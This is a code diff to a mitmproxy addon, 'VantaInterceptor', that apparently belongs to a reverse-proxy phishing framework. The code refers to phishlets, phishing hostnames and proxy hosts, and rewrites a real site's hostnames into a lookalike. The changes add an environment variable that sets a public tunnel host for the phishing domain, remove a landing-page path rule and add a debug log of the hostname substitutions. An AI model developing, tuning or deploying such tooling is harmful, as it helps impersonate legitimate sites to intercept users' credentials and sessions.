@@ -12,6 +12,7 @@ Core mitmproxy addon that handles:
 
 import logging
 import re
+import os
 try:
     from mitmproxy import http, ctx
 except Exception:
@@ -203,6 +204,7 @@ class VantaInterceptor:
                 flow.request.host = target_host
                 try:
                     xfwd = flow.request.headers.get("x-forwarded-host")
+                    
                     xorig = flow.request.headers.get("x-original-host")
                     fwd = flow.request.headers.get("forwarded")
                     import re as _re_ip
@@ -223,7 +225,11 @@ class VantaInterceptor:
                     if ":" in cand:
                         cand = cand.split(":", 1)[0]
                     if _re_ip.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", cand) or cand in ("localhost",):
-                        ph_effective = host
+                        tunnel_host = os.environ.get("VANTA_PUBLIC_HOST")
+                        if tunnel_host:
+                            ph_effective = tunnel_host
+                        else:
+                            ph_effective = host
                     else:
                         ph_effective = cand
                     flow.metadata["v_ph_host"] = ph_effective
@@ -279,7 +285,11 @@ class VantaInterceptor:
                     if ":" in cand:
                         cand = cand.split(":", 1)[0]
                     if _re_ip2.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", cand) or cand in ("localhost",):
-                        ph_effective = host
+                        tunnel_host = os.environ.get("VANTA_PUBLIC_HOST")
+                        if tunnel_host:
+                            ph_effective = tunnel_host
+                        else:
+                            ph_effective = host
                     else:
                         ph_effective = cand
                     flow.metadata["v_ph_host"] = ph_effective
@@ -646,18 +656,14 @@ class VantaInterceptor:
                 
                 search_str = f.search.replace("{hostname}", target_hostname).replace("{domain}", f.domain)
                 replace_str = f.replace.replace("{hostname}", phish_hostname).replace("{domain}", base_domain)
-                # If landing host and bridges are enabled, prefer root-relative path to keep same-origin
-                try:
-                    has_bridges = len(getattr(self.phishlet, "bridges", [])) > 0
-                    is_landing = any((ph.orig_sub == f.orig_sub and ph.domain == f.domain and getattr(ph, "is_landing", False)) for ph in getattr(self.phishlet, "proxy_hosts", []))
-                    if has_bridges and is_landing:
-                        replace_str = "/"
-                except Exception:
-                    pass
+                
                 # If bridged, prefer path-only replacement to avoid absolute host leakage (e.g., 127.0.0.1)
                 if bridge_prefix:
                     replace_str = bridge_prefix
                 
+                # DEBUG LOG
+                self.logger.info(f"SubFilter Apply: {search_str} -> {replace_str}")
+
                 # Apply
                 try:
                     # Use regex if search_str looks like regex?
